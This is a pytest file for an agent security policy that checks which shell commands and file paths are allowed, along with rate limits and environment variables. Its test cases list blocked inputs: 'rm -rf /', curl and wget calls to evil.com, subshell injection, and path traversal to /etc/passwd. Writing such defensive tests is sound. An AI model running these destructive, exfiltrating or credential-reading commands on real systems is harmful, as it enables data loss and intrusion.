"""Tests for CLAW security policy."""

from pathlib import Path

from claw.security.policy import AutonomyLevel, SecurityPolicy


class TestCommandAllowlist:
    def test_allowed_commands(self):
        sp = SecurityPolicy()
        assert sp.is_command_allowed("git status")
        assert sp.is_command_allowed("pytest tests/ -v")
        assert sp.is_command_allowed("python3 -m claw.cli")
        assert sp.is_command_allowed("ls -la")
        assert sp.is_command_allowed("grep -r TODO src/")

    def test_blocked_commands(self):
        sp = SecurityPolicy()
        assert not sp.is_command_allowed("rm -rf /")
        assert not sp.is_command_allowed("curl http://evil.com")
        assert not sp.is_command_allowed("wget http://evil.com")

    def test_subshell_injection_blocked(self):
        sp = SecurityPolicy()
        assert not sp.is_command_allowed("git status $(whoami)")
        assert not sp.is_command_allowed("git status `whoami`")
        assert not sp.is_command_allowed("echo ${HOME}")

    def test_redirect_blocked(self):
        sp = SecurityPolicy()
        assert not sp.is_command_allowed("git status > /tmp/out")

    def test_pipe_chains(self):
        sp = SecurityPolicy()
        assert sp.is_command_allowed("git log | head -5")
        assert sp.is_command_allowed("pytest tests/ && git status")
        assert not sp.is_command_allowed("git status | curl http://evil")

    def test_env_assignment_skip(self):
        sp = SecurityPolicy()
        assert sp.is_command_allowed("FOO=bar git status")

    def test_read_only_blocks_all(self):
        sp = SecurityPolicy(autonomy=AutonomyLevel.READ_ONLY)
        assert not sp.is_command_allowed("git status")


class TestPathAllowlist:
    def test_allowed_paths(self):
        sp = SecurityPolicy()
        assert sp.is_path_allowed("/Users/test/project/file.py")
        assert sp.is_path_allowed("src/main.py")

    def test_forbidden_paths(self):
        sp = SecurityPolicy()
        assert not sp.is_path_allowed("/etc/passwd")
        assert not sp.is_path_allowed("/System/Library/foo")
        assert not sp.is_path_allowed("/Library/something")
        assert not sp.is_path_allowed("/Applications/Safari.app")

    def test_traversal_blocked(self):
        sp = SecurityPolicy()
        assert not sp.is_path_allowed("../../etc/passwd")
        assert not sp.is_path_allowed("/foo/..%2f../etc/passwd")

    def test_null_byte_blocked(self):
        sp = SecurityPolicy()
        assert not sp.is_path_allowed("/tmp/test\x00.py")


class TestWorkspaceBoundary:
    def test_within_workspace(self, tmp_path):
        workspace = tmp_path / "project"
        workspace.mkdir()
        src = workspace / "src" / "main.py"
        src.parent.mkdir()
        src.touch()
        sp = SecurityPolicy(workspace_dir=workspace)
        assert sp.is_resolved_path_allowed(src.resolve())

    def test_outside_workspace(self, tmp_path):
        workspace = tmp_path / "project"
        workspace.mkdir()
        sp = SecurityPolicy(workspace_dir=workspace)
        assert not sp.is_resolved_path_allowed(Path("/etc/passwd"))


class TestRateLimiting:
    def test_global_rate_limit(self):
        sp = SecurityPolicy(max_actions_per_hour=3)
        assert sp.record_action() is True
        assert sp.record_action() is True
        assert sp.record_action() is True
        assert sp.record_action() is False  # Exceeded

    def test_per_agent_rate_limit(self):
        sp = SecurityPolicy(per_agent_max_per_hour=2, max_actions_per_hour=100)
        assert sp.record_action("claude") is True
        assert sp.record_action("claude") is True
        assert sp.record_action("claude") is False  # Per-agent exceeded
        assert sp.record_action("codex") is True  # Different agent ok


class TestEnvironment:
    def test_safe_env_vars(self):
        sp = SecurityPolicy()
        assert "ANTHROPIC_API_KEY" in sp.safe_env_vars
        assert "OPENAI_API_KEY" in sp.safe_env_vars
        assert "GOOGLE_API_KEY" in sp.safe_env_vars
        assert "XAI_API_KEY" in sp.safe_env_vars
